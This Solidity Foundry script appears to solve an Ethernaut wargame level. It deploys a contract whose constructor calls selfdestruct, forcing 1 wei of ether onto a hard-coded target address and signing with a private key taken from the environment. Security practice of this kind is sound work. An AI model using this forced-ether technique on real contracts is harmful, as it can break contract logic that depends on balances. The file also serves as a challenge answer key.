// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

contract SelfDestructContract {
    constructor(address payable _to) payable {
        selfdestruct(_to);
    }
}

contract EthernautL8Script is Script {
    SelfDestructContract public selfDestructContract;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new SelfDestructContract{value: 1 wei}(
            payable(0xB9E8D4d80276CC148e13b6a18E0b9f3078cF031A)
        );
        vm.stopBroadcast();
    }
}
